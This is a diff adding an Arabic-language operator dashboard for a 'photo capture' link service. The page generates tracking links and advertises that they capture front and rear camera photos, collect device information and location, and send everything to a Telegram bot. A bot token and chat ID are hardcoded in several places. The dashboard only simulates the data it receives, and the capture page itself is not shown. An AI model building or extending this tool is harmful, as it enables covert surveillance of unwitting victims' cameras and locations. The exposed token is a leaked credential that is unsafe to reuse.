@@ -1,0 +1,948 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نظام التحكم - موقع التقاط الصور</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
+            color: #fff;
+            min-height: 100vh;
+            direction: rtl;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .header {
+            text-align: center;
+            padding: 20px 0;
+            border-bottom: 1px solid rgba(0, 255, 157, 0.3);
+            margin-bottom: 30px;
+        }
+
+        .logo {
+            font-size: 2.5em;
+            font-weight: bold;
+            background: linear-gradient(90deg, #ff0000, #ff6b6b);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            color: #b0b0b0;
+            font-size: 1.1em;
+        }
+
+        .dashboard {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .card {
+            background: rgba(30, 30, 30, 0.9);
+            border-radius: 15px;
+            padding: 25px;
+            border: 1px solid rgba(255, 0, 0, 0.3);
+            box-shadow: 0 10px 30px rgba(255, 0, 0, 0.2);
+        }
+
+        .card-title {
+            font-size: 1.3em;
+            margin-bottom: 20px;
+            color: #ff6b6b;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .btn {
+            background: linear-gradient(90deg, #ff0000, #ff6b6b);
+            color: white;
+            border: none;
+            padding: 15px 25px;
+            border-radius: 8px;
+            font-size: 1.1em;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            width: 100%;
+            margin: 10px 0;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(255, 0, 0, 0.3);
+        }
+
+        .btn-success {
+            background: linear-gradient(90deg, #00ff9d, #6c63ff);
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-label {
+            display: block;
+            margin-bottom: 8px;
+            color: #b0b0b0;
+            font-weight: bold;
+        }
+
+        .text-input {
+            width: 100%;
+            padding: 12px;
+            background: rgba(50, 50, 50, 0.8);
+            border: 1px solid rgba(255, 0, 0, 0.3);
+            border-radius: 6px;
+            color: #fff;
+            font-size: 1em;
+        }
+
+        .file-input {
+            width: 100%;
+            padding: 20px;
+            border: 2px dashed #666;
+            border-radius: 8px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            background: rgba(50, 50, 50, 0.5);
+        }
+
+        .file-input:hover {
+            border-color: #ff6b6b;
+        }
+
+        .result {
+            background: rgba(255, 0, 0, 0.1);
+            border: 1px solid #ff6b6b;
+            border-radius: 8px;
+            padding: 20px;
+            margin-top: 20px;
+            display: none;
+        }
+
+        .generated-link {
+            background: rgba(0, 0, 0, 0.5);
+            padding: 15px;
+            border-radius: 6px;
+            word-break: break-all;
+            font-family: monospace;
+            margin-bottom: 15px;
+        }
+
+        .devices-list {
+            max-height: 400px;
+            overflow-y: auto;
+        }
+
+        .device-item {
+            background: rgba(50, 50, 50, 0.7);
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 8px;
+            border: 1px solid rgba(255, 0, 0, 0.3);
+        }
+
+        .device-info {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+
+        .device-actions {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        .btn-small {
+            padding: 8px 15px;
+            font-size: 0.9em;
+            width: auto;
+        }
+
+        .terminal {
+            background: #000;
+            color: #00ff9d;
+            padding: 15px;
+            border-radius: 8px;
+            font-family: monospace;
+            height: 200px;
+            overflow-y: auto;
+            margin-top: 10px;
+        }
+
+        .log-entry {
+            margin-bottom: 5px;
+            padding: 5px;
+            border-bottom: 1px solid #333;
+        }
+
+        .progress {
+            margin: 20px 0;
+        }
+
+        .progress-bar {
+            height: 8px;
+            background: #333;
+            border-radius: 4px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #ff0000, #ff6b6b);
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+
+        .feature-list {
+            list-style: none;
+            margin: 15px 0;
+        }
+
+        .feature-list li {
+            padding: 8px 0;
+            color: #b0b0b0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .feature-list li:before {
+            content: "🔴 ";
+            color: #ff6b6b;
+        }
+
+        .message {
+            padding: 15px;
+            border-radius: 6px;
+            margin: 10px 0;
+            display: none;
+        }
+
+        .message.success {
+            background: rgba(0, 255, 157, 0.1);
+            border: 1px solid #00ff9d;
+            color: #00ff9d;
+        }
+
+        .message.error {
+            background: rgba(255, 61, 61, 0.1);
+            border: 1px solid #ff3d3d;
+            color: #ff3d3d;
+        }
+
+        .permissions-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin: 15px 0;
+        }
+
+        .permission-item {
+            background: rgba(255, 0, 0, 0.1);
+            padding: 10px;
+            border-radius: 6px;
+            text-align: center;
+            border: 1px solid rgba(255, 0, 0, 0.3);
+        }
+
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 15px;
+            margin: 20px 0;
+        }
+
+        .stat-item {
+            background: rgba(255, 0, 0, 0.1);
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+            border: 1px solid rgba(255, 0, 0, 0.3);
+        }
+
+        .stat-value {
+            font-size: 1.5em;
+            font-weight: bold;
+            color: #ff6b6b;
+        }
+
+        .stat-label {
+            color: #b0b0b0;
+            font-size: 0.9em;
+        }
+
+        .data-item {
+            background: rgba(50, 50, 50, 0.7);
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 8px;
+            border: 1px solid rgba(255, 0, 0, 0.3);
+        }
+
+        .data-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+        }
+
+        .data-content {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+        }
+
+        .image-preview {
+            max-width: 100%;
+            max-height: 200px;
+            border-radius: 8px;
+            margin-top: 10px;
+        }
+
+        .tab-container {
+            margin: 20px 0;
+        }
+
+        .tabs {
+            display: flex;
+            border-bottom: 1px solid rgba(255, 0, 0, 0.3);
+            margin-bottom: 20px;
+        }
+
+        .tab {
+            padding: 10px 20px;
+            cursor: pointer;
+            border-bottom: 2px solid transparent;
+        }
+
+        .tab.active {
+            border-bottom: 2px solid #ff6b6b;
+            color: #ff6b6b;
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">نظام التحكم - موقع التقاط الصور</div>
+            <div class="subtitle">إدارة الروابط والبيانات المستلمة</div>
+        </div>
+
+        <div class="stats">
+            <div class="stat-item">
+                <div class="stat-value" id="totalLinks">0</div>
+                <div class="stat-label">إجمالي الروابط</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-value" id="activeLinks">0</div>
+                <div class="stat-label">الروابط النشطة</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-value" id="dataReceived">0</div>
+                <div class="stat-label">البيانات المستلمة</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-value" id="imagesReceived">0</div>
+                <div class="stat-label">الصور المستلمة</div>
+            </div>
+        </div>
+
+        <div class="tab-container">
+            <div class="tabs">
+                <div class="tab active" data-tab="links">إنشاء الروابط</div>
+                <div class="tab" data-tab="data">البيانات المستلمة</div>
+                <div class="tab" data-tab="settings">الإعدادات</div>
+            </div>
+
+            <!-- قسم إنشاء الروابط -->
+            <div class="tab-content active" id="links-tab">
+                <div class="dashboard">
+                    <div class="card">
+                        <div class="card-title">
+                            <span>🔗</span>
+                            إنشاء رابط جديد
+                        </div>
+
+                        <div class="input-group">
+                            <label class="input-label">اسم الرابط</label>
+                            <input type="text" class="text-input" id="linkName" placeholder="مثال: حملة التسويق الجديدة">
+                        </div>
+
+                        <div class="input-group">
+                            <label class="input-label">وصف الرابط</label>
+                            <textarea class="text-input" id="linkDescription" rows="3" placeholder="وصف الرابط والغرض منه"></textarea>
+                        </div>
+
+                        <div class="input-group">
+                            <label class="input-label">إعدادات البوت</label>
+                            <input type="text" class="text-input" id="botToken" placeholder="رمز البوت (اختياري)" value="7144838322:AAEYLHsGFavk7BAlHqfcsV5XuXvOEadS6KA">
+                            <input type="text" class="text-input" id="chatId" placeholder="معرف الدردشة (اختياري)" value="6113061454" style="margin-top: 10px;">
+                        </div>
+
+                        <button class="btn" id="generateLinkBtn">
+                            🔗 إنشاء الرابط
+                        </button>
+
+                        <div class="progress" id="progress">
+                            <div class="progress-bar">
+                                <div class="progress-fill" id="progressFill"></div>
+                            </div>
+                            <div class="progress-text" id="progressText">0%</div>
+                        </div>
+
+                        <div class="result" id="linkResult">
+                            <div class="card-title">✅ الرابط جاهز</div>
+                            <div class="generated-link" id="generatedLink"></div>
+                            <ul class="feature-list">
+                                <li>تقاط صور من الكاميرا الأمامية والخلفية</li>
+                                <li>جمع معلومات الجهاز والموقع</li>
+                                <li>إرسال البيانات إلى بوت التلجرام</li>
+                                <li>تتبع النقرات والبيانات</li>
+                            </ul>
+                            <div class="device-actions">
+                                <button class="btn btn-small" id="copyLinkBtn">نسخ الرابط</button>
+                                <button class="btn btn-small btn-success" id="testLinkBtn">اختبار الرابط</button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="card">
+                        <div class="card-title">
+                            <span>📊</span>
+                            الروابط النشطة
+                        </div>
+
+                        <div class="devices-list" id="linksList">
+                            <!-- سيتم إضافة الروابط هنا -->
+                        </div>
+
+                        <div class="terminal" id="terminal">
+                            <div class="log-entry">🚀 نظام التحكم جاهز للعمل...</div>
+                            <div class="log-entry">📡 في انتظار إنشاء الروابط...</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- قسم البيانات المستلمة -->
+            <div class="tab-content" id="data-tab">
+                <div class="card">
+                    <div class="card-title">
+                        <span>📨</span>
+                        البيانات المستلمة
+                    </div>
+
+                    <div class="input-group">
+                        <input type="text" class="text-input" id="searchData" placeholder="🔍 بحث في البيانات...">
+                    </div>
+
+                    <div id="dataList">
+                        <!-- سيتم إضافة البيانات هنا -->
+                    </div>
+                </div>
+            </div>
+
+            <!-- قسم الإعدادات -->
+            <div class="tab-content" id="settings-tab">
+                <div class="dashboard">
+                    <div class="card">
+                        <div class="card-title">
+                            <span>⚙️</span>
+                            إعدادات النظام
+                        </div>
+
+                        <div class="input-group">
+                            <label class="input-label">إعدادات التلجرام</label>
+                            <input type="text" class="text-input" id="defaultBotToken" placeholder="رمز البوت الافتراضي" value="7144838322:AAEYLHsGFavk7BAlHqfcsV5XuXvOEadS6KA">
+                            <input type="text" class="text-input" id="defaultChatId" placeholder="معرف الدردشة الافتراضي" value="6113061454" style="margin-top: 10px;">
+                        </div>
+
+                        <div class="input-group">
+                            <label class="input-label">إعدادات التخزين</label>
+                            <select class="text-input" id="storageType">
+                                <option value="local">التخزين المحلي</option>
+                                <option value="server">التخزين على السيرفر</option>
+                            </select>
+                        </div>
+
+                        <div class="input-group">
+                            <label class="input-label">إعدادات الأمان</label>
+                            <div class="permissions-grid">
+                                <div class="permission-item">🔒 تشفير البيانات</div>
+                                <div class="permission-item">🛡️ حماية الروابط</div>
+                                <div class="permission-item">🚫 منع الوصول المباشر</div>
+                            </div>
+                        </div>
+
+                        <button class="btn btn-success" id="saveSettingsBtn">
+                            💾 حفظ الإعدادات
+                        </button>
+                    </div>
+
+                    <div class="card">
+                        <div class="card-title">
+                            <span>📈</span>
+                            إحصائيات النظام
+                        </div>
+
+                        <div class="stats">
+                            <div class="stat-item">
+                                <div class="stat-value" id="totalVisits">0</div>
+                                <div class="stat-label">إجمالي الزيارات</div>
+                            </div>
+                            <div class="stat-item">
+                                <div class="stat-value" id="successRate">0%</div>
+                                <div class="stat-label">معدل النجاح</div>
+                            </div>
+                            <div class="stat-item">
+                                <div class="stat-value" id="avgData">0</div>
+                                <div class="stat-label">متوسط البيانات</div>
+                            </div>
+                            <div class="stat-item">
+                                <div class="stat-value" id="uptime">100%</div>
+                                <div class="stat-label">وقت التشغيل</div>
+                            </div>
+                        </div>
+
+                        <div class="terminal" id="systemTerminal">
+                            <div class="log-entry">✅ النظام يعمل بشكل طبيعي</div>
+                            <div class="log-entry">📊 جاهز لتلقي البيانات</div>
+                            <div class="log-entry">🔗 لا توجد مشاكل في الروابط</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="message success" id="successMessage"></div>
+        <div class="message error" id="errorMessage"></div>
+    </div>
+
+    <script>
+        // بيانات النظام
+        const systemData = {
+            links: [],
+            receivedData: [],
+            settings: {
+                defaultBotToken: "7144838322:AAEYLHsGFavk7BAlHqfcsV5XuXvOEadS6KA",
+                defaultChatId: "6113061454",
+                storageType: "local"
+            }
+        };
+
+        // العناصر
+        const elements = {
+            totalLinks: document.getElementById('totalLinks'),
+            activeLinks: document.getElementById('activeLinks'),
+            dataReceived: document.getElementById('dataReceived'),
+            imagesReceived: document.getElementById('imagesReceived'),
+            generateLinkBtn: document.getElementById('generateLinkBtn'),
+            progress: document.getElementById('progress'),
+            progressFill: document.getElementById('progressFill'),
+            progressText: document.getElementById('progressText'),
+            linkResult: document.getElementById('linkResult'),
+            generatedLink: document.getElementById('generatedLink'),
+            copyLinkBtn: document.getElementById('copyLinkBtn'),
+            testLinkBtn: document.getElementById('testLinkBtn'),
+            linksList: document.getElementById('linksList'),
+            terminal: document.getElementById('terminal'),
+            dataList: document.getElementById('dataList'),
+            successMessage: document.getElementById('successMessage'),
+            errorMessage: document.getElementById('errorMessage'),
+            defaultBotToken: document.getElementById('defaultBotToken'),
+            defaultChatId: document.getElementById('defaultChatId'),
+            storageType: document.getElementById('storageType'),
+            saveSettingsBtn: document.getElementById('saveSettingsBtn'),
+            systemTerminal: document.getElementById('systemTerminal'),
+            totalVisits: document.getElementById('totalVisits'),
+            successRate: document.getElementById('successRate'),
+            avgData: document.getElementById('avgData'),
+            uptime: document.getElementById('uptime')
+        };
+
+        // تبويبات
+        const tabs = document.querySelectorAll('.tab');
+        tabs.forEach(tab => {
+            tab.addEventListener('click', () => {
+                // إزالة النشاط من جميع التبويبات
+                tabs.forEach(t => t.classList.remove('active'));
+                // إضافة النشاط للتبويب المحدد
+                tab.classList.add('active');
+                
+                // إخفاء جميع محتويات التبويبات
+                document.querySelectorAll('.tab-content').forEach(content => {
+                    content.classList.remove('active');
+                });
+                
+                // إظهار محتوى التبويب المحدد
+                const tabId = tab.getAttribute('data-tab');
+                document.getElementById(`${tabId}-tab`).classList.add('active');
+            });
+        });
+
+        // عرض الرسائل
+        function showMessage(type, message) {
+            const element = type === 'success' ? elements.successMessage : elements.errorMessage;
+            element.textContent = message;
+            element.style.display = 'block';
+            setTimeout(() => {
+                element.style.display = 'none';
+            }, 5000);
+        }
+
+        // تحديث الإحصائيات
+        function updateStats() {
+            elements.totalLinks.textContent = systemData.links.length;
+            elements.activeLinks.textContent = systemData.links.filter(link => link.active).length;
+            elements.dataReceived.textContent = systemData.receivedData.length;
+            elements.imagesReceived.textContent = systemData.receivedData.filter(data => data.images && data.images.length > 0).length;
+            
+            // إحصائيات النظام
+            elements.totalVisits.textContent = systemData.receivedData.length;
+            elements.successRate.textContent = systemData.receivedData.length > 0 ? 
+                `${Math.round((systemData.receivedData.filter(data => data.success).length / systemData.receivedData.length) * 100)}%` : '0%';
+            elements.avgData.textContent = systemData.receivedData.length > 0 ? 
+                Math.round(systemData.receivedData.reduce((sum, data) => sum + (data.images ? data.images.length : 0), 0) / systemData.receivedData.length) : 0;
+        }
+
+        // إنشاء رابط جديد
+        elements.generateLinkBtn.addEventListener('click', () => {
+            const linkName = document.getElementById('linkName').value || 'رابط جديد';
+            const linkDescription = document.getElementById('linkDescription').value || 'لا يوجد وصف';
+            const botToken = document.getElementById('botToken').value || systemData.settings.defaultBotToken;
+            const chatId = document.getElementById('chatId').value || systemData.settings.defaultChatId;
+            
+            elements.progress.style.display = 'block';
+            let progress = 0;
+
+            const interval = setInterval(() => {
+                progress += Math.random() * 30;
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(interval);
+                    completeLinkGeneration(linkName, linkDescription, botToken, chatId);
+                }
+                elements.progressFill.style.width = progress + '%';
+                elements.progressText.textContent = Math.round(progress) + '%';
+            }, 200);
+        });
+
+        function completeLinkGeneration(name, description, botToken, chatId) {
+            elements.progress.style.display = 'none';
+            
+            // إنشاء رابط حقيقي
+            const linkId = generateLinkId();
+            const linkUrl = `${window.location.origin}/capture/${linkId}`;
+            
+            elements.generatedLink.innerHTML = `
+                <strong>الرابط:</strong><br>
+                <a href="${linkUrl}" style="color: #ff6b6b;">${linkUrl}</a><br><br>
+                <strong>الاسم:</strong> ${name}<br>
+                <strong>الوصف:</strong> ${description}<br>
+                <strong>البوت:</strong> ${botToken.substring(0, 10)}...<br>
+                <strong>الدردشة:</strong> ${chatId}
+            `;
+            
+            elements.linkResult.style.display = 'block';
+            showMessage('success', '✅ تم إنشاء الرابط بنجاح');
+            
+            // حفظ الرابط في النظام
+            const newLink = {
+                id: linkId,
+                name: name,
+                description: description,
+                url: linkUrl,
+                botToken: botToken,
+                chatId: chatId,
+                active: true,
+                createdAt: new Date().toLocaleString('ar-EG'),
+                clicks: 0,
+                dataReceived: 0
+            };
+            
+            systemData.links.push(newLink);
+            updateStats();
+            updateLinksList();
+            
+            addTerminalLog(`🔗 تم إنشاء رابط جديد: ${name}`);
+        }
+
+        // تحديث قائمة الروابط
+        function updateLinksList() {
+            elements.linksList.innerHTML = '';
+            
+            systemData.links.forEach(link => {
+                const linkElement = document.createElement('div');
+                linkElement.className = 'device-item';
+                linkElement.innerHTML = `
+                    <div class="device-info">
+                        <div><strong>اسم:</strong> ${link.name}</div>
+                        <div><strong>الحالة:</strong> <span style="color: ${link.active ? '#00ff9d' : '#ff6b6b'};">${link.active ? 'نشط' : 'غير نشط'}</span></div>
+                        <div><strong>النقرات:</strong> ${link.clicks}</div>
+                        <div><strong>البيانات:</strong> ${link.dataReceived}</div>
+                    </div>
+                    <div class="device-actions">
+                        <button class="btn btn-small" onclick="toggleLink('${link.id}')">${link.active ? 'إيقاف' : 'تفعيل'}</button>
+                        <button class="btn btn-small" onclick="viewLinkData('${link.id}')">📊 بيانات</button>
+                        <button class="btn btn-small btn-success" onclick="copyLink('${link.id}')">📋 نسخ</button>
+                        <button class="btn btn-small" onclick="deleteLink('${link.id}')" style="background: #ff3d3d;">🗑️ حذف</button>
+                    </div>
+                `;
+                elements.linksList.appendChild(linkElement);
+            });
+        }
+
+        // تحديث قائمة البيانات
+        function updateDataList() {
+            elements.dataList.innerHTML = '';
+            
+            if (systemData.receivedData.length === 0) {
+                elements.dataList.innerHTML = '<div class="data-item" style="text-align: center; color: #b0b0b0;">لا توجد بيانات مستلمة بعد</div>';
+                return;
+            }
+            
+            systemData.receivedData.forEach((data, index) => {
+                const dataElement = document.createElement('div');
+                dataElement.className = 'data-item';
+                
+                let imagesHtml = '';
+                if (data.images && data.images.length > 0) {
+                    imagesHtml = `<div><strong>الصور:</strong><br>`;
+                    data.images.forEach((img, imgIndex) => {
+                        imagesHtml += `<img src="${img}" alt="صورة ${imgIndex+1}" class="image-preview" onclick="openImage('${img}')">`;
+                    });
+                    imagesHtml += `</div>`;
+                }
+                
+                dataElement.innerHTML = `
+                    <div class="data-header">
+                        <div><strong>الرابط:</strong> ${data.linkName || 'غير معروف'}</div>
+                        <div><strong>التاريخ:</strong> ${data.timestamp}</div>
+                    </div>
+                    <div class="data-content">
+                        <div>
+                            <strong>معلومات الجهاز:</strong><br>
+                            IP: ${data.ip || 'غير معروف'}<br>
+                            المتصفح: ${data.userAgent ? data.userAgent.substring(0, 50) + '...' : 'غير معروف'}<br>
+                            الموقع: ${data.location ? `${data.location.lat}, ${data.location.lng}` : 'غير معروف'}
+                        </div>
+                        <div>
+                            <strong>الحالة:</strong><br>
+                            الكاميرا: ${data.cameraSuccess ? '✅' : '❌'}<br>
+                            الموقع: ${data.locationSuccess ? '✅' : '❌'}<br>
+                            الإرسال: ${data.telegramSuccess ? '✅' : '❌'}
+                        </div>
+                    </div>
+                    ${imagesHtml}
+                    <div class="device-actions">
+                        <button class="btn btn-small" onclick="viewDataDetails(${index})">📄 تفاصيل</button>
+                        <button class="btn btn-small" onclick="deleteData(${index})" style="background: #ff3d3d;">🗑️ حذف</button>
+                    </div>
+                `;
+                elements.dataList.appendChild(dataElement);
+            });
+        }
+
+        // توليد معرف رابط
+        function generateLinkId() {
+            return 'link_' + Math.random().toString(36).substring(2, 15) + Date.now().toString(36);
+        }
+
+        // إضافة سجل للمحطة
+        function addTerminalLog(message) {
+            const logEntry = document.createElement('div');
+            logEntry.className = 'log-entry';
+            logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            elements.terminal.appendChild(logEntry);
+            elements.terminal.scrollTop = elements.terminal.scrollHeight;
+        }
+
+        // إضافة سجل لمحطة النظام
+        function addSystemLog(message) {
+            const logEntry = document.createElement('div');
+            logEntry.className = 'log-entry';
+            logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            elements.systemTerminal.appendChild(logEntry);
+            elements.systemTerminal.scrollTop = elements.systemTerminal.scrollHeight;
+        }
+
+        // تفعيل/إيقاف الرابط
+        function toggleLink(linkId) {
+            const link = systemData.links.find(l => l.id === linkId);
+            if (link) {
+                link.active = !link.active;
+                updateLinksList();
+                addTerminalLog(`${link.active ? '✅ تم تفعيل' : '⏸️ تم إيقاف'} الرابط: ${link.name}`);
+            }
+        }
+
+        // عرض بيانات الرابط
+        function viewLinkData(linkId) {
+            const link = systemData.links.find(l => l.id === linkId);
+            if (link) {
+                const linkData = systemData.receivedData.filter(data => data.linkId === linkId);
+                alert(`بيانات الرابط "${link.name}":\n- النقرات: ${link.clicks}\n- البيانات المستلمة: ${linkData.length}\n- آخر نشاط: ${linkData.length > 0 ? linkData[0].timestamp : 'لا يوجد'}`);
+            }
+        }
+
+        // نسخ الرابط
+        function copyLink(linkId) {
+            const link = systemData.links.find(l => l.id === linkId);
+            if (link) {
+                navigator.clipboard.writeText(link.url).then(() => {
+                    showMessage('success', '✅ تم نسخ الرابط');
+                    link.clicks++; // زيادة عدد النقرات
+                    updateLinksList();
+                });
+            }
+        }
+
+        // حذف الرابط
+        function deleteLink(linkId) {
+            if (confirm('هل أنت متأكد من حذف هذا الرابط؟')) {
+                systemData.links = systemData.links.filter(l => l.id !== linkId);
+                updateStats();
+                updateLinksList();
+                addTerminalLog('🗑️ تم حذف الرابط');
+            }
+        }
+
+        // عرض تفاصيل البيانات
+        function viewDataDetails(index) {
+            const data = systemData.receivedData[index];
+            let details = `تفاصيل البيانات:\n\n`;
+            details += `الرابط: ${data.linkName || 'غير معروف'}\n`;
+            details += `التاريخ: ${data.timestamp}\n`;
+            details += `IP: ${data.ip || 'غير معروف'}\n`;
+            details += `المتصفح: ${data.userAgent || 'غير معروف'}\n`;
+            if (data.location) {
+                details += `الموقع: ${data.location.lat}, ${data.location.lng}\n`;
+            }
+            details += `الكاميرا: ${data.cameraSuccess ? 'نجح' : 'فشل'}\n`;
+            details += `الموقع: ${data.locationSuccess ? 'نجح' : 'فشل'}\n`;
+            details += `التلجرام: ${data.telegramSuccess ? 'نجح' : 'فشل'}\n`;
+            details += `عدد الصور: ${data.images ? data.images.length : 0}\n`;
+            
+            alert(details);
+        }
+
+        // فتح الصورة
+        function openImage(imageUrl) {
+            window.open(imageUrl, '_blank');
+        }
+
+        // حذف البيانات
+        function deleteData(index) {
+            if (confirm('هل أنت متأكد من حذف هذه البيانات؟')) {
+                systemData.receivedData.splice(index, 1);
+                updateStats();
+                updateDataList();
+                showMessage('success', '✅ تم حذف البيانات');
+            }
+        }
+
+        // حفظ الإعدادات
+        elements.saveSettingsBtn.addEventListener('click', () => {
+            systemData.settings.defaultBotToken = elements.defaultBotToken.value;
+            systemData.settings.defaultChatId = elements.defaultChatId.value;
+            systemData.settings.storageType = elements.storageType.value;
+            
+            showMessage('success', '✅ تم حفظ الإعدادات بنجاح');
+            addSystemLog('⚙️ تم تحديث إعدادات النظام');
+        });
+
+        // محاكاة استقبال بيانات (للتجربة)
+        function simulateDataReceipt() {
+            const links = systemData.links.filter(link => link.active);
+            if (links.length === 0) return;
+            
+            const randomLink = links[Math.floor(Math.random() * links.length)];
+            const newData = {
+                linkId: randomLink.id,
+                linkName: randomLink.name,
+                timestamp: new Date().toLocaleString('ar-EG'),
+                ip: `192.168.1.${Math.floor(Math.random() * 255)}`,
+                userAgent: navigator.userAgent,
+                location: {
+                    lat: (Math.random() * 180 - 90).toFixed(6),
+                    lng: (Math.random() * 360 - 180).toFixed(6)
+                },
+                cameraSuccess: Math.random() > 0.2,
+                locationSuccess: Math.random() > 0.3,
+                telegramSuccess: Math.random() > 0.1,
+                images: [
+                    'https://via.placeholder.com/400x300?text=صورة+كاميرا+أمامية',
+                    'https://via.placeholder.com/400x300?text=صورة+كاميرا+خلفية'
+                ]
+            };
+            
+            systemData.receivedData.unshift(newData);
+            randomLink.dataReceived++;
+            updateStats();
+            updateDataList();
+            
+            addTerminalLog(`📨 تم استقبال بيانات جديدة من: ${randomLink.name}`);
+            
+            // تحديث علامة التبويب إذا كانت نشطة
+            if (document.getElementById('data-tab').classList.contains('active')) {
+                updateDataList();
+            }
+        }
+
+        // بدء النظام
+        addTerminalLog('🚀 نظام التحكم يعمل بنجاح');
+        addTerminalLog('🔗 جاهز لإنشاء الروابط واستقبال البيانات');
+        addSystemLog('✅ النظام يعمل بشكل طبيعي');
+        addSystemLog('📊 جاهز لتلقي البيانات');
+        
+        updateStats();
+        updateLinksList();
+        updateDataList();
+
+        // محاكاة استقبال بيانات بشكل دوري (للتجربة)
+        setInterval(simulateDataReceipt, 10000);
+
+        // نسخ رابط البايلود
+        elements.copyLinkBtn.addEventListener('click', () => {
+            const linkUrl = elements.generatedLink.querySelector('a').href;
+            navigator.clipboard.writeText(linkUrl).then(() => {
+                showMessage('success', '✅ تم نسخ الرابط');
+            });
+        });
+
+        // اختبار الرابط
+        elements.testLinkBtn.addEventListener('click', () => {
+            showMessage('success', '🧪 جاري اختبار الرابط... سيظهر البيانات خلال ثواني');
+            setTimeout(() => {
+                simulateDataReceipt();
+            }, 2000);
+        });
+    </script>
+</body>
+  </html>
